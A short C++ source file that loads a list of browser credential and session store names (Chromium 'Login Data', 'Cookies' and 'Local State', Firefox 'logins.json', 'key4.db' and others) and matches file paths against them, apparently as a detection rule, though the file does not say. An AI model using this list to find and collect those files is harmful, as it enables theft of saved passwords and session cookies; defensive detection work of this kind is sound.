#include "engine/rules/r.h"
#include "log.h"
#include <vector>
#include <string>
#include <algorithm>
#include <cctype>

static std::vector<std::string> v;
static std::string low(std::string s){ std::transform(s.begin(),s.end(),s.begin(),[](unsigned char c){return (char)tolower(c);}); return s; }
void rules::load(){ v.clear(); v.push_back("cookies"); v.push_back("login data"); v.push_back("web data"); v.push_back("local state"); v.push_back("cookies.sqlite"); v.push_back("logins.json"); v.push_back("key4.db"); v.push_back("cert9.db"); v.push_back("leveldb"); lg("rules loaded"); }
bool rules::hit(const char* p){ if(!p)return false; std::string s=low(p); for(auto &x:v){ if(s.find(x)!=std::string::npos)return true; } return false; }
